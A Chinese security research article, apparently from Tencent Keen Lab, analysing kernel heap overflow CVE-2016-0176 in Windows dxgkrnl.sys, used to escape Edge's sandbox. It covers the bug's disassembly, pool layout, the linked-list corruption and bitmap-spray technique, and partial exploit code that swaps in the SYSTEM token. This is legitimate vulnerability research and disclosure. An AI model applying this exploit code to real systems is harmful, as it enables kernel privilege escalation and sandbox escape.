来源: [腾讯科恩实验室官方博客](http://keenlab.tencent.com/zh/2016/11/18/A-Link-to-System-Privilege/)

作者： **Daniel King (@long123king)**

### 如何攻破微软的Edge浏览器

攻破微软的Edge浏览器至少需要包含两方面基本要素：浏览器层面的远程代码执行(RCE: Remote Code Execution)和浏览器沙箱绕过。
浏览器层面的远程代码执行通常通过利用Javascript脚本的漏洞完成，而浏览器的沙箱绕过则可以有多种方式，比如用户态的逻辑漏洞，以及通过内核漏洞达到本地提权(EoP:
Escalation of Privilege)。

微软Edge浏览器使用的沙箱是建立在Windows操作系统的权限检查机制之上的。在Windows操作系统中，资源是可以在全系统范围内被共享的，比如一个文件或者设备可以在不同进程间被共享。由于有些资源里面包含着敏感信息，而另外一些资源的完整性则关乎系统的正常运转，如果被破坏了就会导致整个系统的崩溃。因此当一个进程在访问资源时需要进行严格的权限检查。当一个资源被打开时，主调进程的令牌信息会与目标资源的安全描述符信息进行匹配检查。权限检查由几个不同层面的子检查组成：属主身份及组身份检查，特权检查，完整性级别及可信级别检查，Capability检查等等。上一代的沙箱是基于完整性级别机制的，在沙箱里面运行的应用程序处于Low完整性级别，因此无法访问处于Medium或者更高级别的资源。微软的Edge浏览器采用的是最新一代的沙箱机制，这代沙箱是基于AppContainer的，运行在沙箱里的应用程序依然处于Low完整性级别，当它们尝试访问资源时，除了进行完整性级别检查，还需要进行Capabilities的检查，这种检查更加细腻以及个性化。关于权限检查机制的更多细节，可以参考我在ZeroNights
2015上的演讲：[Did You Get Your
Token?](https://github.com/long123king/tokenext/blob/master/doc/Did_You_Get_Your_Token.pdf)

沙箱绕过的最常用的方法是通过内核态的漏洞利用，直接操作内核对象(DKOM: Direct Kernel Object
Manipulation)以达到本地提权。

### CVE-2016-0176

这个漏洞是位于dxgkrnl.sys驱动中，是一个内核堆溢出漏洞。

被篡改的数据结构定义如下：

    
    
    typedef struct _D3DKMT_PRESENTHISTORYTOKEN
    {
        D3DKMT_PRESENT_MODEL  Model; //D3DKMT_PM_REDIRECTED_FLIP      = 2,
        UINT                  TokenSize; // 0x438
        UINT64                CompositionBindingId;
    
        union
        {
            D3DKMT_FLIPMODEL_PRESENTHISTORYTOKEN        Flip;
            D3DKMT_BLTMODEL_PRESENTHISTORYTOKEN         Blt;
            D3DKMT_VISTABLTMODEL_PRESENTHISTORYTOKEN    VistaBlt;
            D3DKMT_GDIMODEL_PRESENTHISTORYTOKEN         Gdi;
            D3DKMT_FENCE_PRESENTHISTORYTOKEN            Fence;
            D3DKMT_GDIMODEL_SYSMEM_PRESENTHISTORYTOKEN  GdiSysMem;
            D3DKMT_COMPOSITION_PRESENTHISTORYTOKEN      Composition;
        }
        Token;
    } D3DKMT_PRESENTHISTORYTOKEN;

我们把这个数据结构简称为”history token”，想要激发这个漏洞需要将关键成员变量按如下定义：

  * **Model** 要设置为 **D3DKMT_PM_REDIRECTED_FLIP** ;
  * **TokenSize** 要设置为 **0x438** ;

你大概已经猜到漏洞是存在在 **Token.Flip** 成员里面，该成员类型定义如下：

    
    
    typedef struct _D3DKMT_FLIPMODEL_PRESENTHISTORYTOKEN
    {
        UINT64                                     FenceValue;
        ULONG64                                    hLogicalSurface;
        UINT_PTR                                   dxgContext;
        D3DDDI_VIDEO_PRESENT_SOURCE_ID             VidPnSourceId;
    
        ……
    
        D3DKMT_DIRTYREGIONS                        DirtyRegions;
    } D3DKMT_FLIPMODEL_PRESENTHISTORYTOKEN;

继续深入到 **DirtyRegions** 的类型定义：

    
    
    typedef struct tagRECT
    {
        LONG    left;
        LONG    top;
        LONG    right;
        LONG    bottom;
    } RECT, *PRECT, NEAR *NPRECT, FAR *LPRECT; // 0x10 bytes
    
    typedef struct _D3DKMT_DIRTYREGIONS
    {
        UINT  NumRects;
    
        RECT  Rects[D3DKMT_MAX_PRESENT_HISTORY_RECTS]; // 0x10 * 0x10 = 0x100 bytes
    
         //#define D3DKMT_MAX_PRESENT_HISTORY_RECTS 16
    
    } D3DKMT_DIRTYREGIONS;

现在我们已经到达了最基本类型的定义, 看到一个成员是DWORD类型的 **NumRects** , 另外一个是数组 **RECT** ，其中每个元素的类型是
**Rects** , 这个数组是定长的，有16个元素的空间，每个元素0x10字节，每个这个数组的总长度是0x100字节。

![](https://images.seebug.org/content/images/2016/11/edge_eop_img_1.png-w331s)

上图展示了被篡改的数据结构的布局以及它们之间的关系，左面一栏是我们在调用 Win32 API 函数 **D3DKMTPresent**
时从用户态传入的数据结构，中间一栏是dxgkrnl.sys驱动接收到并维护的对应的数据结构，它是从左面一栏的数据结构中拷贝出来的，而右面一栏是内嵌定义在history
token中的成员 **Token.Flip** 的数据结构。我们知道一个union的大小是由其成员中最大的成员大小决定的，而在这里
**Token.Flip** 恰好是union **Token** 中最大的一个成员，也就是说整个history token数据结构是由
**Token.Flip** 中的内容填满直到结尾，这个特征非常重要，大大简化了利用的复杂度。

有了上面关于数据结构的知识，我们就可以很方便地理解这个漏洞了，现在展示的是引起漏洞的汇编代码片断：

    
    
    loc_1C009832A: DXGCONTEXT::SubmitPresentHistoryToken(......) + 0x67B
            cmp     dword ptr[r15 + 334h], 10h // NumRects
            jbe     short loc_1C009834B; Jump if Below or Equal(CF = 1 | ZF = 1)
            call    cs : __imp_WdLogNewEntry5_WdAssertion
            mov     rcx, rax
            mov     qword ptr[rax + 18h], 38h
            call    cs : __imp_WdLogEvent5_WdAssertion
    
    loc_1C009834B: DXGCONTEXT::SubmitPresentHistoryToken (......) + 0x6B2
            mov     eax, [r15 + 334h]
            shl     eax, 4
            add     eax, 338h
            jmp     short loc_1C00983BD
    
    loc_1C00983BD: DXGCONTEXT::SubmitPresentHistoryToken (......) + 0x6A5
            lea     r8d, [rax + 7]
            mov     rdx, r15; Src
            mov     eax, 0FFFFFFF8h;
            mov     rcx, rsi; Dst
            and     r8, rax; Size
            call    memmove

在这片代码的入口处，r15寄存器指向的是history
token结构的内存区域。代码首先从内存区域的0x334偏移处取出一个DWORD，并与0x10进行比较，通过上图我们可以看到取出的DWORD正是
**Token.Flip.NumRects** 成员，而0x10则是内嵌数组 **Token.Flip.Rects** 容量，所以这里比较的是
**Token.Flip.NumRects** 的值是否超出了 **Token.Flip.Rects**
数组的容量。如果你是在代码审查时遇到了这段代码，那么你可能会自言自语道大事不妙，微软已经意识到了这个潜在的溢出，并做了比较严格的检查。硬着头皮往下看，当溢出发生时，代码会以assertion的方式将这个异常情况记录到watch
dog驱动，但是这个比对后的产生的两个代码分枝最终又都在loc_1C009834B处会合。可能你会想watch
dog驱动有机会对代码溢出情况做出反应，通过bug check主动蓝屏(BSOD)，然而事实上什么都没有发生。 不管你对
**Token.Flip.NumRects** 这个变量设置什么值，代码都会最终执行到loc_1C009834B处的代码块，这个代码块对
**Token.Flip.NumRects** 值做了一些基础的算术运算，并且用运算的结果指定memcpy操作拷贝的长度。

为了更加直观地说明问题，把汇编代码改写成对应的C++代码：

    
    
    D3DKMT_PRESENTHISTORYTOKEN* hist_token_src = BufferPassedFromUserMode(…);
    D3DKMT_PRESENTHISTORYTOKEN* hist_token_dst = ExpInterlockedPopEntrySList(…);
    
    if(hist_token_src->dirty_regions.NumRects > 0x10)
    {
        // log via watch dog assertion, NOT work in free/release build
    }
    
    auto size = (hist_token_src->dirty_regions.NumRects * 0x10 + 0x338 + 7) / 8;
    auto src = (uint8_t*)hist_token_src;
    auto dst = (uint8_t*)hist_token_dst;
    memcpy(dst, src, size);

事情更加简单明了，无论我们给 **Token.Flip.NumRects**
指定什么样的值，一个内存拷贝操作在所难免，拷贝操作的源数据正是我们通过调用Win32 API **D3DKMTPresent**
从用户态传入的buffer，拷贝操作的目标是通过调用 **ExpInterlockedPopEntrySList**
从内核堆上分配的buffer，而拷贝操作的长度是通过计算拥有 **Token.Flip.NumRects**
个元素的数组的长度，再加上数组成员在history token结构体中的偏移，以及因为对齐产生的padding长度。如果我们为
**Token.Flip.NumRects**
指定了一个大于0x10的长度，那么内核堆溢出就发生了，我们可以控制溢出的长度，以及溢出的前0x38字节内容(如上面介绍数据结构布局的图所示，在从用户态传入的数据中，我们可以控制history
token结构后面的0x38字节数据)。

这个漏洞非常有意思，因为微软已经预见了它的存在却没能阻止它的发生，我们可以从中得到的教训是不要滥用编程技巧，除非你知道你自己在干什么，比如assertion机制。

### 利用

对于一个堆利用来说，了解目标内存区域附近的内存布局至关重要，我们已经知道目标内存是通过 **ExpInterlockedPopEntrySList**
函数在内核态内存池中分配的。

通过简单调试，我们可以得到如下内存池信息：

    
    
    kd> u rip-6 L2
    dxgkrnl!DXGCONTEXT::SubmitPresentHistoryToken+0x47b:
    fffff801`cedb80fb call    qword ptr [dxgkrnl!_imp_ExpInterlockedPopEntrySList (fffff801`ced77338)]
    fffff801`cedb8101 test    rax,rax
    kd> !pool rax
    Pool page ffffc0012764c5a0 region is Paged pool
    *ffffc0012764b000 : large page allocation, tag is DxgK, size is 0x2290 bytes
        Pooltag DxgK : Vista display driver support, Binary : dxgkrnl.sys

这是一个比较大的内存区域，大小为0x2290字节，因为这个大小已经超过了一个内存页的长度(一个内存页是0x1000字节)，所以它是以大页内存(Large
Page Allocation)分配的，三个连续内存页被用来响应这次大页内存分配申请，为了节约内存，在0x2290之后的多余空间被回收并且链接到了Paged
Pool的free
list上面，供后续的小内存分配使用。在0x2290之后，会插入一个起到分隔作用的标记为Frag的内存分配。关于内核内存池及大页分配的详情，参考Tarjei
Mandt的白皮书：[Kernel Pool Exploitation on Windows
7](https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf)。下面展示的是在0x2290偏移附近的内存内容：

    
    
    kd> db ffffc0012764b000+0x2290 L40
    ffffc001`2764d290  00 01 02 03 46 72 61 67-00 00 00 00 00 00 00 00  ....Frag........
    ffffc001`2764d2a0  90 22 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ."..............
    ffffc001`2764d2b0  02 01 01 00 46 72 65 65-0b 43 44 9e f1 81 a8 47  ....Free.CD....G
    ffffc001`2764d2c0  01 01 04 03 4e 74 46 73-c0 32 42 3a 00 e0 ff ff  ....NtFs.2B:....

驱动dxgkrnl.sys中的 **DXGPRESENTHISTORYTOKENQUEUE::GrowPresentHistoryBuffer**
函数用来分配并管理一个链接history token的单链表。每个history
token的长度是0x438字节，加上内存池分配的头部及padding一共0x450字节，所以0x2290大小的内存被平均分成8个history
token，并且以倒序的方式链接在单链表中。驱动dxgkrnl.sys意图将单链表以look-aside list的方式来响应单个history
token的内存分配请求。

单链表初始状态时如下所示：

![](http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_2.svg)

单链表在响应过一个history token分配请求后如下所示：

![](http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_3.svg)

单链表在响应过两个history token分配请求后如下所示：

![](http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_4.svg)

明确了溢出的目标内存处的内存布局，我们得到两种溢出方案：

#### 方案1：溢出0x2290偏移后面的复用的小内存分配空间:

![](http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_5.svg)

#### 方案2：溢出相邻的单链表头部，转化成单链表利用:

![](http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_6.svg)

方案1有诸多限制，因为我们只能控制溢出的前0x38字节内容，这意味着减掉padding空间，用于分隔的frag内存池分配项目的长度以及接下来的内存池分配的头部，我们没有多余发挥的空间。

方案2看起来很可行，虽然我们知道Windows内核现在已经强制对双链表进行完整性检查，但是对于单链表没有任何检查，因此我们可以通过覆盖单链表中的next指针达到重定向读写的目标。

为了进一步验证可行性，我们先在头脑里演绎一下方案2的种种可能。上面的几张图已经展示了从单链表中弹出两个history
token的情形，此时我们可以溢出节点B，让它覆盖节点A的头部，然后我们将节点B压回单链表：

![](http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_7.svg)

当我们把节点A也压回单链表时，接下来会怎样，会不会如我们所料将单链表的读写重定向到被溢出覆盖的next指针处

![](http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_9.svg)

很遗憾并非如我们所料，这种重定向读写不会发生，因为当我们将节点A压回单链表时，覆盖的QWORD会恢复成指向节点B的指针：

![](http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_10.svg)

我们回到已经弹出两个节点的状态再尝试另外一种可能： ![](http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_11.svg)

这次我们先将节点A压回单链表:

![](http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_12.svg)

然后我们溢出节点B，以覆盖节点A的头部，因为此时节点A已经被回收进单链表，所以不会再有任何操作可以将子节点A的头部恢复了。现在单链表已经被破坏了，它的第二个元素已经指向了溢出覆盖的QWORD所指向的内存处。:

![](http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_13.svg)
经过了上面的演绎，我们对方案2信心十足，现在我们就开始动手吧！看起来我们必须对单链表乱序调用push和pop，至少要有两次连续的pop，我做了如下的尝试：

#### 尝试1：循环调用D3DKMTPresent并传入可导致溢出的buffer。

结果失败了，经过调试发现每次都在重复pop节点A，使用后push节点A这个循环，根本不会产生乱序。原因很简单，循环调用D3DKMTPresent被逐个响应，所以我们必须同时调用它才能产生乱序。

#### 尝试2：在多线程中循环调用D3DKMTPresent并传入可导致溢出的buffer。

结果又失败了，经过一些简单的逆向分析，D3DKMTPresent的调用路径应该是被加锁保护了。

经历了两次挫败，不免开始怀疑人生，是否会出现两次连续的pop呢？然后很快就意识到绝对可行，肯定是我姿势不对，否则这相对复杂的单链表就退化成单个变量了，肯定有其他的内核调用路径可以激发单链表pop操作。我编写了一个windbg脚本记录每次push和pop操作，然后尝试打开一些图形操作密集的应用程序，只要发现了两次连续的pop就证明发现了第二条路径。经过简单的尝试，奇迹出现了，当我打开Solitaire游戏时，两次pop出现了，经过简单的调试，发现
**BitBlt** API会触发第二条pop的内核路径。

#### 尝试3：在多线程中循环调用D3DKMTPresent并传入可导致溢出的buffer，同时在另外一批多线程中循环调用BitBlt。

这一次终于成功地将单链表中的next指针重定向到指定位置，达到了内核态任意地址写的目的。但是这种写的能力有限，很难重复，而我们想要通过DKOM方式偷换令牌需要多次内核读写，而这种矛盾在Pwn2Own
2016的3次尝试总时间15分钟的严苛比赛规则下显得更加突出，我们需要一些其他技巧。

### 其他技巧

#### 如何达到可重复的内核态任意地址读写

为了达到这个目标，我使用win32k的位图bitmap对象作为中间目标。首先向内核态内存中spray大量的bitmap对象，然后猜测它们的位置，并试图通过上面的重定向写技巧修改它们的头部，当我成功地命中第一个bitmap对象后，通过修改它的头部中的buffer指针和长度，让其指向第二个bitmap对象。因此总共需要控制两个bitmap对象，第一个用来控制读写的地址，而第二个用来控制读写的内容。

再详细地讲，我一共向内核内存中spray了4GB的bitmap对象，首先通过喷射大尺寸的256MB的bitmap对象来锁定空间以及引导内存对齐，然后将它们逐个替换成1MB的小尺寸bitmap对象，这些对象肯定位于0x100000的边界处，就使得猜测它们的地址更加简单。

在猜测bitmap对象地址的过程中需要信息泄露来加快猜测速度，这是通过 **user32! gSharedInfo** 完成的。

#### 偷换令牌

有了可重复地任意地址读写的能力后，再加上通过sidt泄露内核模块的地址，我们可以方便地定位到 **nt!PspCidTable**
指向的句柄表，然后从中找出当前进程以及system进程对应的_EPROCESS结构体，进而找到各自的_TOKEN结构的地址，从而完成替换。

#### 部分利用代码

    
    
    VOID ThPresent(THREAD_HOST * th)
    {
        SIZE_T hint = 0;
        while (TRUE)
        {
            HIST_TOKEN ht = { 0, };
            HtInitialize(&ht);
    
            SIZE_T victim_surf_obj = ThNextGuessedAddr(th, ++hint);
    
            SIZE_T buffer_ptr = victim_surf_obj + 0x200000 + 0x18;
            th->backupBufferPtr1 = victim_surf_obj + 0x258;
            th->backupBufferPtr2 = victim_surf_obj + 0x200000 + 0x258;
    
            SIZE_T back_offset = 0x10;
    
            SURFOBJ surf_obj = { 0, };
    
            surf_obj.cjBits = 0x80;
            surf_obj.pvBits = (PVOID)buffer_ptr;
            surf_obj.pvScan0 = (PVOID)buffer_ptr;
            surf_obj.sizlBitmap.cx = 0x04;
            surf_obj.sizlBitmap.cy = 0x08;
            surf_obj.iBitmapFormat = 0x06;
            surf_obj.iType = 0;
            surf_obj.fjBitmap = 0x01;
            surf_obj.lDelta = 0x10;
    
            DWORD dwBuff = 0x04800200;
            HtSetBuffer(&ht, 0x18 + th->memberOffset - back_offset, (unsigned char*)&surf_obj, 0x68);
            HtSetBuffer(&ht, 0x70 + th->memberOffset - back_offset, &dwBuff, sizeof(DWORD));
    
    
            if (th->memberOffset - back_offset + 0xE8 < 0x448)
            {
                SIZE_T qwBuff = victim_surf_obj + 0xE0;
                HtSetBuffer(&ht, 0xE0 + th->memberOffset - back_offset, &qwBuff, sizeof(SIZE_T));
                HtSetBuffer(&ht, 0xE8 + th->memberOffset - back_offset, &qwBuff, sizeof(SIZE_T));
            }
    
    
            if (th->memberOffset - back_offset + 0x1C0 < 0x448)
            {
                SIZE_T qwBuff = victim_surf_obj + 0x1B8;
                HtSetBuffer(&ht, 0x1B8 + th->memberOffset - back_offset, &qwBuff, sizeof(SIZE_T));
                HtSetBuffer(&ht, 0x1C0 + th->memberOffset - back_offset, &qwBuff, sizeof(SIZE_T));
            }
    
            HtOverflowNextSListEntry(&ht, victim_surf_obj);
            HtTrigger(&ht);
    
            if (th->triggered)
                break;
        }
    }
    
    VOID ThTrigger(THREAD_HOST * th)
    {
        SIZE_T i = 0;
        HANDLE threads[TH_MAX_THREADS] = { 0, };
        unsigned char second_buffer[0x78] = { 0, };
    
        for (SIZE_T i = 0; i < TH_MAX_THREADS; i++)
        {
            if (th->triggered)
            {
                break;
            }
    
            if (i == 9)
            {
                DWORD thread_id = 0;
                threads[i] = CreateThread(NULL, 0, ProbeThreadProc, th, 0, &thread_id);
            }
            else if (i % 3 != 0 && i > 0x10)
            {
                DWORD thread_id = 0;
                threads[i] = CreateThread(NULL, 0, PresentThreadProc, th, 0, &thread_id);
            }           
            else
            {
                DWORD thread_id = 0;
                threads[i] = CreateThread(NULL, 0, BitbltThreadProc, th, 0, &thread_id);
            }
        }
    
        for (i = 0; i < TH_MAX_THREADS; i++)
        {
            if (threads[i] != NULL)
            {
                if (WAIT_OBJECT_0 == WaitForSingleObject(threads[i], INFINITE))
                {
                    CloseHandle(threads[i]);
                    threads[i] = NULL;
                }
            }
        }
    
        Log("trigged\n");
    
        ThRead(th, (const void*)th->backupBufferPtr2, second_buffer, 0x78);
    
        ADDR_RESOLVER ar = { 0, };
        ArInitialize(&ar, th);
    
        SIZE_T nt_addr = ArNTBase(&ar); 
        SIZE_T psp_cid_table_addr = nt_addr + PSP_CIDTABLE_OFFSET;
        SIZE_T psp_cid_table_value;
    
        ThRead(th, psp_cid_table_addr, &psp_cid_table_value, 0x08);
    
        SIZE_T psp_cid_table[0x0C] = { 0, };
        ThRead(th, psp_cid_table_value, psp_cid_table, 0x60);
    
        SIZE_T table_code = psp_cid_table[1];
        SIZE_T handle_count = psp_cid_table[0x0B] & 0x00000000ffffffff;
    
        SIZE_T curr_pid = GetCurrentProcessId();
    
        do
        {
            ThParseCidTable(th, table_code, handle_count);
            Sleep(1000);
        } while (th->currentEprocess == NULL || th->systemEprocess == NULL);
    
        SIZE_T curr_proc = th->currentEprocess;
        SIZE_T system_proc = th->systemEprocess;
    
        SIZE_T system_token = 0;
        ThRead(th, (system_proc + 0x358), &system_token, 0x08);
    
        SIZE_T curr_token = 0;
        ThRead(th, (curr_proc + 0x358), &curr_token, 0x08);
    
        ThWrite(th, (curr_proc + 0x358), &system_token, 0x08);
    
        ThRead(th, (curr_proc + 0x358), &curr_token, 0x08);
    
        ThRestore(th);
    
        Log("elevated\n");
    
        Sleep(3600000);
    
        return;
    }

### 参考:

  1. [Rainbow Over the Windows](https://ruxcon.org.au/assets/2016/slides/Rainbow_over_the_Windows.pdf)
  2. [Did You Get Your Token?](https://github.com/long123king/tokenext/blob/master/doc/Did_You_Get_Your_Token.pdf)
  3. [Windows Kernel Exploitation : This Time Font hunt you down in 4 bytes](http://www.slideshare.net/PeterHlavaty/windows-kernel-exploitation-this-time-font-hunt-you-down-in-4-bytes)
  4. [Kernel Pool Exploitation on Windows 7](https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/117/>

